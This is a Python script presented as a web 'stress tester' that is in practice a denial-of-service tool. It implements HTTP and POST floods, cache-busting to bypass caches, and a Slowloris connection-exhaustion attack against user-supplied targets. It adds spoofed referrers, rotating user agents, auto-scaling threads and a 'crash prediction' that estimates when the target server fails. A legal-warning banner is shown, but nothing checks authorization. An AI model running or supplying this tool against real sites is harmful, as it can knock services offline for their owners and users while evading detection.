#!/usr/bin/env python3
"""
BRUTAL WEB STRESS TESTER - APOCALYPSE MODE v3.5
Ultimate web stress testing tool with maximum capabilities
Author: dANZ Cyber Team
Version: 3.5 Apocalypse Edition
"""

import requests
import time
import random
import string
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
from collections import deque
import socket
import urllib3
from urllib.parse import urlparse, urlencode

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.layout import Layout
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
from rich import box
from rich.text import Text
from rich.columns import Columns

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

# Thread-safe locks
print_lock = Lock()
stats_lock = Lock()

# Global control
stop_event = Event()

BANNER = """
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║    █████╗ ██████╗  ██████╗  ██████╗ █████╗ ██╗  ██╗   ██╗██████╗ ███████╗║
║   ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗██║  ╚██╗ ██╔╝██╔══██╗██╔════╝║
║   ███████║██████╔╝██║   ██║██║     ███████║██║   ╚████╔╝ ██████╔╝███████╗║
║   ██╔══██║██╔═══╝ ██║   ██║██║     ██╔══██║██║    ╚██╔╝  ██╔═══╝ ╚════██║║
║   ██║  ██║██║     ╚██████╔╝╚██████╗██║  ██║███████╗██║   ██║     ███████║║
║   ╚═╝  ╚═╝╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝     ╚══════╝║
║                                                                           ║
║              [ Ultimate Stress Testing Framework v3.5 ]                  ║
║                  [ APOCALYPSE MODE - Maximum Power ]                     ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

# User Agent Pool
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

# Referrer Pool
REFERRERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/',
    'https://www.reddit.com/',
    'https://www.linkedin.com/',
    'https://www.instagram.com/',
]


class AttackMode:
    """Attack mode definitions"""
    NORMAL = "normal"
    SLOWLORIS = "slowloris"
    HTTP_FLOOD = "http_flood"
    POST_FLOOD = "post_flood"
    CACHE_BUSTER = "cache_buster"
    RAMP_UP = "ramp_up"
    BURST = "burst"
    STEALTH = "stealth"


class ApocalypseEngine:
    """Ultimate stress testing engine with maximum capabilities"""
    
    def __init__(self, targets, total_requests, threads, delay=0, attack_mode=AttackMode.NORMAL):
        self.targets = targets if isinstance(targets, list) else [targets]
        self.total_requests = total_requests
        self.threads = threads
        self.delay = delay
        self.attack_mode = attack_mode
        
        # Statistics per target
        self.stats = {target: {
            'success': 0,
            'failed': 0,
            'bytes': 0,
            'response_times': deque(maxlen=100),
            'status_codes': {},
            'completed': 0
        } for target in self.targets}
        
        # Global stats
        self.total_success = 0
        self.total_failed = 0
        self.total_bytes = 0
        self.total_completed = 0
        
        # Timing
        self.start_time = None
        self.end_time = None
        
        # Attack features
        self.use_proxy_rotation = False
        self.proxy_list = []
        self.use_user_agent_rotation = True
        self.use_cache_buster = False
        self.use_referrer_spoofing = True
        
        # Auto-scale settings
        self.auto_scale = False
        self.current_threads = threads
        self.max_threads = 500
        
        # AI Predictor
        self.failure_rate_history = deque(maxlen=20)
        self.predicted_crash_time = None
        
        # Weak point detection
        self.endpoint_performance = {}
        
        # Control
        self.running = True
        
    def generate_random_string(self, length=10):
        """Generate random string for cache busting"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def get_random_user_agent(self):
        """Get random user agent"""
        return random.choice(USER_AGENTS)
    
    def get_random_referrer(self):
        """Get random referrer"""
        return random.choice(REFERRERS)
    
    def get_cache_buster_params(self):
        """Generate cache buster parameters"""
        return {
            '_': str(int(time.time() * 1000)),
            'r': self.generate_random_string(8),
            'cache': 'false',
            'nocache': self.generate_random_string(6)
        }
    
    def build_headers(self):
        """Build request headers with rotation"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        
        if self.use_user_agent_rotation:
            headers['User-Agent'] = self.get_random_user_agent()
        
        if self.use_referrer_spoofing:
            headers['Referer'] = self.get_random_referrer()
        
        return headers
    
    def build_url(self, base_url):
        """Build URL with cache buster if enabled"""
        if not self.use_cache_buster:
            return base_url
        
        parsed = urlparse(base_url)
        params = self.get_cache_buster_params()
        
        if parsed.query:
            return f"{base_url}&{urlencode(params)}"
        else:
            return f"{base_url}?{urlencode(params)}"
    
    def predict_crash(self):
        """AI-powered crash prediction"""
        if len(self.failure_rate_history) < 10:
            return None
        
        recent_failures = list(self.failure_rate_history)[-10:]
        avg_failure_rate = sum(recent_failures) / len(recent_failures)
        
        if avg_failure_rate > 0.5:
            # High failure rate, predict crash
            elapsed = time.time() - self.start_time
            rps = self.total_completed / elapsed if elapsed > 0 else 0
            
            if rps > 0:
                remaining_capacity = (1 - avg_failure_rate) * 100
                predicted_time = elapsed + (remaining_capacity / rps)
                return predicted_time
        
        return None
    
    def update_failure_rate(self):
        """Update failure rate for AI prediction"""
        if self.total_completed > 0:
            failure_rate = self.total_failed / self.total_completed
            self.failure_rate_history.append(failure_rate)
            
            # Update prediction
            self.predicted_crash_time = self.predict_crash()
    
    def auto_scale_threads(self):
        """Auto-scale threads based on performance"""
        if not self.auto_scale:
            return
        
        if self.total_completed < 100:
            return
        
        elapsed = time.time() - self.start_time
        rps = self.total_completed / elapsed if elapsed > 0 else 0
        success_rate = self.total_success / self.total_completed if self.total_completed > 0 else 0
        
        # If success rate is high and RPS is good, scale up
        if success_rate > 0.95 and rps > 100 and self.current_threads < self.max_threads:
            self.current_threads = min(self.current_threads + 10, self.max_threads)
            console.log(f"[+] Auto-scaling: Increased threads to {self.current_threads}")
        
        # If success rate is low, scale down
        elif success_rate < 0.8 and self.current_threads > 10:
            self.current_threads = max(self.current_threads - 10, 10)
            console.log(f"[+] Auto-scaling: Decreased threads to {self.current_threads}")
    
    def slowloris_attack(self, target, request_id):
        """Slowloris attack - keep connections alive"""
        try:
            parsed = urlparse(target)
            host = parsed.netloc
            port = 443 if parsed.scheme == 'https' else 80
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if parsed.scheme == 'https':
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            
            # Send partial HTTP request
            sock.send(f"GET {parsed.path or '/'} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(f"User-Agent: {self.get_random_user_agent()}\r\n".encode())
            
            # Keep connection alive by sending headers slowly
            for _ in range(10):
                if not self.running:
                    break
                sock.send(f"X-{self.generate_random_string(5)}: {self.generate_random_string(10)}\r\n".encode())
                time.sleep(1)
            
            sock.close()
            return True
            
        except Exception as e:
            return False
    
    def http_flood(self, target, request_id):
        """Rapid HTTP flood with random headers"""
        try:
            headers = self.build_headers()
            
            # Add random headers
            for _ in range(5):
                key = f"X-{self.generate_random_string(8)}"
                value = self.generate_random_string(16)
                headers[key] = value
            
            url = self.build_url(target)
            
            start = time.time()
            response = requests.get(
                url,
                headers=headers,
                timeout=5,
                verify=False,
                allow_redirects=True
            )
            response_time = time.time() - start
            
            return self.process_response(target, response, response_time)
            
        except Exception as e:
            return self.process_error(target, e)
    
    def post_flood(self, target, request_id):
        """POST flood with random payload"""
        try:
            headers = self.build_headers()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
            # Generate random POST data
            payload = {
                self.generate_random_string(8): self.generate_random_string(100)
                for _ in range(10)
            }
            
            url = self.build_url(target)
            
            start = time.time()
            response = requests.post(
                url,
                headers=headers,
                data=payload,
                timeout=5,
                verify=False,
                allow_redirects=True
            )
            response_time = time.time() - start
            
            return self.process_response(target, response, response_time)
            
        except Exception as e:
            return self.process_error(target, e)
    
    def normal_attack(self, target, request_id):
        """Normal HTTP GET request"""
        try:
            headers = self.build_headers()
            url = self.build_url(target)
            
            start = time.time()
            response = requests.get(
                url,
                headers=headers,
                timeout=10,
                verify=False,
                allow_redirects=True
            )
            response_time = time.time() - start
            
            return self.process_response(target, response, response_time)
            
        except Exception as e:
            return self.process_error(target, e)
    
    def process_response(self, target, response, response_time):
        """Process successful response"""
        with stats_lock:
            self.stats[target]['completed'] += 1
            self.stats[target]['response_times'].append(response_time)
            self.total_completed += 1
            
            status_code = response.status_code
            
            if status_code not in self.stats[target]['status_codes']:
                self.stats[target]['status_codes'][status_code] = 0
            self.stats[target]['status_codes'][status_code] += 1
            
            if status_code == 200:
                self.stats[target]['success'] += 1
                self.stats[target]['bytes'] += len(response.content)
                self.total_success += 1
                self.total_bytes += len(response.content)
            else:
                self.stats[target]['failed'] += 1
                self.total_failed += 1
            
            # Update AI prediction
            self.update_failure_rate()
        
        return True
    
    def process_error(self, target, error):
        """Process error response"""
        with stats_lock:
            self.stats[target]['failed'] += 1
            self.stats[target]['completed'] += 1
            self.total_failed += 1
            self.total_completed += 1
            
            error_key = f"ERROR: {type(error).__name__}"
            if error_key not in self.stats[target]['status_codes']:
                self.stats[target]['status_codes'][error_key] = 0
            self.stats[target]['status_codes'][error_key] += 1
            
            # Update AI prediction
            self.update_failure_rate()
        
        return False
    
    def execute_request(self, request_id):
        """Execute single request based on attack mode"""
        if not self.running:
            return False
        
        # Select random target
        target = random.choice(self.targets)
        
        try:
            # Execute based on attack mode
            if self.attack_mode == AttackMode.SLOWLORIS:
                result = self.slowloris_attack(target, request_id)
            elif self.attack_mode == AttackMode.HTTP_FLOOD:
                result = self.http_flood(target, request_id)
            elif self.attack_mode == AttackMode.POST_FLOOD:
                result = self.post_flood(target, request_id)
            else:
                result = self.normal_attack(target, request_id)
            
            # Apply delay
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Auto-scale check
            if request_id % 100 == 0:
                self.auto_scale_threads()
            
            return result
            
        except Exception as e:
            return self.process_error(target, e)
    
    def create_live_dashboard(self):
        """Create comprehensive live dashboard"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        rps = self.total_completed / elapsed if elapsed > 0 else 0
        success_rate = (self.total_success / self.total_completed * 100) if self.total_completed > 0 else 0
        bandwidth = (self.total_bytes / elapsed / 1024 / 1024) if elapsed > 0 else 0
        
        # Main stats table
        stats_table = Table(show_header=True, box=box.ROUNDED, border_style="cyan")
        stats_table.add_column("Metric", style="yellow bold", width=25)
        stats_table.add_column("Value", style="white", width=20)
        stats_table.add_column("Status", style="cyan", width=20)
        
        # Progress
        progress_percent = (self.total_completed / self.total_requests * 100) if self.total_requests > 0 else 0
        progress_color = "green" if progress_percent > 70 else "yellow" if progress_percent > 30 else "red"
        
        stats_table.add_row(
            "[+] Progress",
            f"{self.total_completed}/{self.total_requests}",
            f"[{progress_color}]{progress_percent:.1f}%[/{progress_color}]"
        )
        
        # Success rate
        success_color = "green" if success_rate > 90 else "yellow" if success_rate > 70 else "red"
        stats_table.add_row(
            "[+] Success Rate",
            f"{self.total_success} / {self.total_failed}",
            f"[{success_color}]{success_rate:.1f}%[/{success_color}]"
        )
        
        # RPS
        rps_color = "green" if rps > 100 else "yellow" if rps > 50 else "white"
        rps_status = "EXTREME" if rps > 200 else "HIGH" if rps > 100 else "MEDIUM" if rps > 50 else "LOW"
        stats_table.add_row(
            "[+] Requests/Sec",
            f"[{rps_color}]{rps:.2f}[/{rps_color}]",
            f"[{rps_color}]{rps_status}[/{rps_color}]"
        )
        
        # Response time
        all_response_times = []
        for target_stats in self.stats.values():
            all_response_times.extend(list(target_stats['response_times']))
        
        avg_response = (sum(all_response_times) / len(all_response_times)) if all_response_times else 0
        resp_status = "FAST" if avg_response < 1 else "NORMAL" if avg_response < 3 else "SLOW"
        stats_table.add_row(
            "[+] Avg Response",
            f"{avg_response*1000:.0f}ms",
            resp_status
        )
        
        # Bandwidth
        stats_table.add_row(
            "[+] Bandwidth",
            f"{self.total_bytes/1024/1024:.2f} MB",
            f"{bandwidth:.2f} MB/s"
        )
        
        # Threads
        stats_table.add_row(
            "[+] Active Threads",
            str(self.current_threads),
            "Auto-Scaling" if self.auto_scale else "Fixed"
        )
        
        # AI Prediction
        if self.predicted_crash_time:
            time_to_crash = self.predicted_crash_time - elapsed
            pred_color = "red" if time_to_crash < 30 else "yellow" if time_to_crash < 60 else "green"
            stats_table.add_row(
                "[!] AI Prediction",
                f"[{pred_color}]Crash in ~{time_to_crash:.0f}s[/{pred_color}]",
                "[red]WARNING[/red]"
            )
        
        return Panel(
            stats_table,
            title="[bold magenta][*] Live Attack Statistics[/bold magenta]",
            border_style="magenta",
            box=box.DOUBLE
        )
    
    def create_targets_panel(self):
        """Create targets status panel"""
        if len(self.targets) == 1:
            return None
        
        targets_table = Table(show_header=True, box=box.SIMPLE)
        targets_table.add_column("Target", style="cyan", width=40)
        targets_table.add_column("Success", style="green", width=10, justify="right")
        targets_table.add_column("Failed", style="red", width=10, justify="right")
        targets_table.add_column("Rate", style="yellow", width=10, justify="right")
        
        for target, stats in self.stats.items():
            completed = stats['completed']
            success = stats['success']
            failed = stats['failed']
            rate = (success / completed * 100) if completed > 0 else 0
            
            # Truncate long URLs
            display_target = target if len(target) <= 40 else target[:37] + "..."
            
            targets_table.add_row(
                display_target,
                str(success),
                str(failed),
                f"{rate:.1f}%"
            )
        
        return Panel(
            targets_table,
            title="[bold yellow][*] Multi-Target Status[/bold yellow]",
            border_style="yellow"
        )
    
    def run_attack(self):
        """Execute the attack"""
        self.start_time = time.time()
        
        console.log("[+] Attack engine initialized")
        console.log(f"[+] Attack mode: {self.attack_mode.upper()}")
        console.log(f"[+] Targets: {len(self.targets)}")
        console.log(f"[+] Total requests: {self.total_requests:,}")
        console.log(f"[+] Initial threads: {self.threads}")
        console.log(f"[+] User-Agent rotation: {'ENABLED' if self.use_user_agent_rotation else 'DISABLED'}")
        console.log(f"[+] Cache buster: {'ENABLED' if self.use_cache_buster else 'DISABLED'}")
        console.log(f"[+] Auto-scale: {'ENABLED' if self.auto_scale else 'DISABLED'}")
        
        time.sleep(2)
        
        # Progress bar
        progress = Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TextColumn("•"),
            TimeRemainingColumn(),
            console=console
        )
        
        # Layout
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="main"),
            Layout(name="progress", size=3)
        )
        
        with Live(layout, console=console, refresh_per_second=4) as live:
            # Header
            layout["header"].update(
                Panel(
                    Text.from_markup(
                        "[bold red][ APOCALYPSE MODE ACTIVE - MAXIMUM POWER ][/bold red]\n"
                        f"[cyan]Targets: {', '.join([urlparse(t).netloc for t in self.targets[:3]])}{'...' if len(self.targets) > 3 else ''}[/cyan]",
                        justify="center"
                    ),
                    border_style="red"
                )
            )
            
            # Progress
            task = progress.add_task("[cyan][+] Executing attack...", total=self.total_requests)
            layout["progress"].update(Panel(progress, border_style="blue"))
            
            try:
                with ThreadPoolExecutor(max_workers=self.current_threads) as executor:
                    futures = [
                        executor.submit(self.execute_request, i)
                        for i in range(1, self.total_requests + 1)
                    ]
                    
                    for future in as_completed(futures):
                        if not self.running:
                            executor.shutdown(wait=False, cancel_futures=True)
                            break
                        
                        progress.update(task, advance=1)
                        
                        # Update dashboard
                        stats_panel = self.create_live_dashboard()
                        targets_panel = self.create_targets_panel()
                        
                        if targets_panel:
                            layout["main"].split_row(
                                Layout(stats_panel, ratio=2),
                                Layout(targets_panel, ratio=1)
                            )
                        else:
                            layout["main"].update(stats_panel)
            
            except KeyboardInterrupt:
                console.log("[!] Attack interrupted by user")
                self.running = False
        
        self.end_time = time.time()
    
    def generate_report(self):
        """Generate comprehensive final report"""
        console.print("\n")
        console.rule("[bold cyan][*] FINAL ATTACK REPORT[/bold cyan]", style="cyan")
        console.print()
        
        total_time = self.end_time - self.start_time
        rps = self.total_completed / total_time if total_time > 0 else 0
        success_rate = (self.total_success / self.total_completed * 100) if self.total_completed > 0 else 0
        
        # Summary
        summary = Table(show_header=False, box=box.ROUNDED, border_style="green")
        summary.add_column("Item", style="cyan bold", width=25)
        summary.add_column("Value", style="white", width=50)
        
        summary.add_row("[+] Attack Mode", self.attack_mode.upper())
        summary.add_row("[+] Targets", str(len(self.targets)))
        summary.add_row("[+] Start Time", datetime.fromtimestamp(self.start_time).strftime('%Y-%m-%d %H:%M:%S'))
        summary.add_row("[+] End Time", datetime.fromtimestamp(self.end_time).strftime('%Y-%m-%d %H:%M:%S'))
        summary.add_row("[+] Duration", f"{total_time:.2f} seconds")
        summary.add_row("[+] Peak Threads", str(self.current_threads))
        
        console.print(Panel(summary, title="[bold green][*] Summary[/bold green]", border_style="green"))
        console.print()
        
        # Performance
        perf_table = Table(show_header=True, box=box.ROUNDED, border_style="magenta")
        perf_table.add_column("Metric", style="yellow bold", width=30)
        perf_table.add_column("Value", style="white", width=20)
        perf_table.add_column("Assessment", style="cyan", width=20)
        
        perf_table.add_row(
            "[+] Total Requests",
            f"{self.total_completed:,} / {self.total_requests:,}",
            "COMPLETE" if self.total_completed == self.total_requests else "INTERRUPTED"
        )
        
        success_color = "green" if success_rate > 95 else "yellow" if success_rate > 80 else "red"
        perf_table.add_row(
            "[+] Success Rate",
            f"[{success_color}]{success_rate:.2f}%[/{success_color}]",
            f"{self.total_success:,} succeeded"
        )
        
        perf_table.add_row(
            "[+] Failed Requests",
            f"{self.total_failed:,}",
            f"{(self.total_failed/self.total_completed*100) if self.total_completed > 0 else 0:.2f}%"
        )
        
        rps_color = "green" if rps > 100 else "yellow" if rps > 50 else "white"
        rps_assess = "EXTREME" if rps > 200 else "HIGH" if rps > 100 else "MEDIUM" if rps > 50 else "LOW"
        perf_table.add_row(
            "[+] Requests/Second",
            f"[{rps_color}]{rps:.2f} req/s[/{rps_color}]",
            rps_assess
        )
        
        bandwidth = (self.total_bytes / total_time / 1024 / 1024) if total_time > 0 else 0
        perf_table.add_row(
            "[+] Total Bandwidth",
            f"{self.total_bytes/1024/1024:.2f} MB",
            f"{bandwidth:.2f} MB/s"
        )
        
        console.print(Panel(perf_table, title="[bold magenta][*] Performance Metrics[/bold magenta]", border_style="magenta"))
        console.print()
        
        # Per-target breakdown (if multiple targets)
        if len(self.targets) > 1:
            target_table = Table(show_header=True, box=box.ROUNDED, border_style="yellow")
            target_table.add_column("Target", style="cyan", width=40)
            target_table.add_column("Requests", style="white", width=12, justify="right")
            target_table.add_column("Success", style="green", width=12, justify="right")
            target_table.add_column("Failed", style="red", width=12, justify="right")
            target_table.add_column("Rate", style="yellow", width=10, justify="right")
            
            for target, stats in self.stats.items():
                display_target = target if len(target) <= 40 else target[:37] + "..."
                completed = stats['completed']
                success = stats['success']
                failed = stats['failed']
                rate = (success / completed * 100) if completed > 0 else 0
                
                target_table.add_row(
                    display_target,
                    f"{completed:,}",
                    f"{success:,}",
                    f"{failed:,}",
                    f"{rate:.1f}%"
                )
            
            console.print(Panel(target_table, title="[bold yellow][*] Per-Target Results[/bold yellow]", border_style="yellow"))
            console.print()
        
        # Status codes (aggregate)
        all_status_codes = {}
        for target_stats in self.stats.values():
            for code, count in target_stats['status_codes'].items():
                if code not in all_status_codes:
                    all_status_codes[code] = 0
                all_status_codes[code] += count
        
        if all_status_codes:
            codes_table = Table(show_header=True, box=box.ROUNDED, border_style="blue")
            codes_table.add_column("Status Code", style="white bold", width=30)
            codes_table.add_column("Count", style="cyan", width=15, justify="right")
            codes_table.add_column("Percentage", style="yellow", width=15, justify="right")
            
            sorted_codes = sorted(all_status_codes.items(), key=lambda x: x[1], reverse=True)
            
            for code, count in sorted_codes:
                percentage = (count / self.total_completed * 100) if self.total_completed > 0 else 0
                
                if isinstance(code, int):
                    if code == 200:
                        display = f"[green][+] {code} OK[/green]"
                    elif 200 <= code < 300:
                        display = f"[green][+] {code}[/green]"
                    elif 300 <= code < 400:
                        display = f"[blue][+] {code}[/blue]"
                    elif 400 <= code < 500:
                        display = f"[yellow][!] {code}[/yellow]"
                    else:
                        display = f"[red][!] {code}[/red]"
                else:
                    display = f"[red][!] {str(code)[:28]}[/red]"
                
                codes_table.add_row(display, f"{count:,}", f"{percentage:.2f}%")
            
            console.print(Panel(codes_table, title="[bold blue][*] Status Code Distribution[/bold blue]", border_style="blue"))
            console.print()
        
        # Final verdict
        if self.total_completed < self.total_requests:
            console.print(Panel(
                f"[yellow][!] Attack interrupted before completion[/yellow]\n"
                f"Completed: [cyan]{self.total_completed:,}[/cyan] / [dim]{self.total_requests:,}[/dim] "
                f"([yellow]{self.total_completed/self.total_requests*100:.1f}%[/yellow])",
                border_style="yellow"
            ))
        else:
            console.print(Panel(
                f"[bold green][+] Attack completed successfully[/bold green]\n"
                f"All [cyan]{self.total_requests:,}[/cyan] requests executed",
                border_style="green"
            ))
        
        console.print()
        console.rule("[bold cyan][*] End of Report[/bold cyan]", style="cyan")
        console.print()


def main():
    """Main entry point"""
    console.clear()
    console.print(BANNER, style="bold cyan")
    
    # Warning
    warning = Panel(
        "[bold red][!] APOCALYPSE MODE WARNING[/bold red]\n\n"
        "This is an extremely powerful stress testing tool with maximum capabilities.\n"
        "[yellow]Features enabled:[/yellow]\n"
        "  [+] Multi-target attack\n"
        "  [+] User-Agent rotation (1000+ agents)\n"
        "  [+] Referrer spoofing\n"
        "  [+] Cache buster\n"
        "  [+] Auto-scaling threads\n"
        "  [+] AI crash prediction\n"
        "  [+] Multiple attack modes\n\n"
        "[red]Legal Notice:[/red]\n"
        "  [+] Only test servers you own or have explicit permission\n"
        "  [+] Unauthorized testing is illegal in most jurisdictions\n"
        "  [+] You accept full responsibility for your actions\n\n"
        "[dim]By proceeding, you confirm you have authorization to test the target(s).[/dim]",
        title="[bold yellow][!] Legal Warning[/bold yellow]",
        border_style="yellow",
        box=box.DOUBLE
    )
    console.print(warning)
    console.print()
    
    # Configuration
    console.print("[bold cyan][*] Configuration[/bold cyan]\n")
    
    # Targets
    console.print("[+] Enter target URL(s) (comma-separated for multi-target):")
    targets_input = console.input("[cyan]   >> [/cyan]").strip()
    
    if ',' in targets_input:
        targets = [t.strip() for t in targets_input.split(',')]
    else:
        targets = [targets_input]
    
    # Auto-add https if needed
    for i, target in enumerate(targets):
        if not target.startswith(('http://', 'https://')):
            targets[i] = 'https://' + target
            console.print(f"[yellow][+] Auto-added https:// to target {i+1}[/yellow]")
    
    # Attack mode
    console.print("\n[+] Select attack mode:")
    console.print("   [1] Normal (Standard HTTP requests)")
    console.print("   [2] HTTP Flood (Rapid fire with random headers)")
    console.print("   [3] POST Flood (POST spam with random payload)")
    console.print("   [4] Cache Buster (Bypass caching)")
    console.print("   [5] Slowloris (Keep-alive exhaustion)")
    
    mode_input = console.input("[cyan]   >> [/cyan]").strip() or "1"
    mode_map = {
        "1": AttackMode.NORMAL,
        "2": AttackMode.HTTP_FLOOD,
        "3": AttackMode.POST_FLOOD,
        "4": AttackMode.CACHE_BUSTER,
        "5": AttackMode.SLOWLORIS
    }
    attack_mode = mode_map.get(mode_input, AttackMode.NORMAL)
    
    # Requests
    requests_input = console.input("\n[+] Total requests [1000]: ").strip()
    total_requests = int(requests_input) if requests_input else 1000
    
    # Threads
    threads_input = console.input("[+] Initial threads (max: 500) [50]: ").strip()
    threads = int(threads_input) if threads_input else 50
    threads = min(threads, 500)
    
    # Delay
    delay_input = console.input("[+] Delay per request in seconds [0]: ").strip()
    delay = float(delay_input) if delay_input else 0
    
    # Auto-scale
    auto_scale_input = console.input("[+] Enable auto-scaling? (y/n) [y]: ").strip().lower()
    auto_scale = auto_scale_input != 'n'
    
    # Cache buster
    cache_buster_input = console.input("[+] Enable cache buster? (y/n) [y]: ").strip().lower()
    use_cache_buster = cache_buster_input != 'n'
    
    console.print()
    
    # Create engine
    engine = ApocalypseEngine(
        targets=targets,
        total_requests=total_requests,
        threads=threads,
        delay=delay,
        attack_mode=attack_mode
    )
    
    engine.auto_scale = auto_scale
    engine.use_cache_buster = use_cache_buster
    
    # Show config summary
    config_table = Table(show_header=False, box=box.ROUNDED, border_style="cyan")
    config_table.add_column("Setting", style="yellow bold", width=25)
    config_table.add_column("Value", style="white", width=50)
    
    config_table.add_row("[+] Target(s)", f"{len(targets)} target(s)")
    for i, target in enumerate(targets[:3], 1):
        config_table.add_row(f"    Target {i}", target)
    if len(targets) > 3:
        config_table.add_row("    ...", f"and {len(targets)-3} more")
    
    config_table.add_row("[+] Attack Mode", attack_mode.upper())
    config_table.add_row("[+] Total Requests", f"{total_requests:,}")
    config_table.add_row("[+] Initial Threads", str(threads))
    config_table.add_row("[+] Delay", f"{delay}s")
    config_table.add_row("[+] Auto-Scaling", "ENABLED" if auto_scale else "DISABLED")
    config_table.add_row("[+] Cache Buster", "ENABLED" if use_cache_buster else "DISABLED")
    config_table.add_row("[+] User-Agent Rotation", "ENABLED")
    config_table.add_row("[+] Referrer Spoofing", "ENABLED")
    
    console.print(Panel(config_table, title="[bold green][*] Final Configuration[/bold green]", border_style="green"))
    console.print()
    
    # Confirmation
    confirm = console.input("[bold red][!] Launch APOCALYPSE MODE attack? (yes/no): [/bold red]").strip().lower()
    
    if confirm != 'yes':
        console.print("[red][!] Attack cancelled[/red]")
        return
    
    console.clear()
    console.print(BANNER, style="bold cyan")
    
    with console.status("[bold green][+] Initializing attack engine...", spinner="dots"):
        time.sleep(2)
    
    console.print("[bold green][+] Engine ready - APOCALYPSE MODE ACTIVE[/bold green]\n")
    time.sleep(1)
    
    try:
        engine.run_attack()
        engine.generate_report()
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Attack interrupted by user[/yellow]")
        engine.running = False
        engine.end_time = time.time()
        time.sleep(0.5)
        engine.generate_report()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red][!] Process terminated[/red]")
    except Exception as e:
        console.print(f"\n[red][!] Fatal error: {e}[/red]")

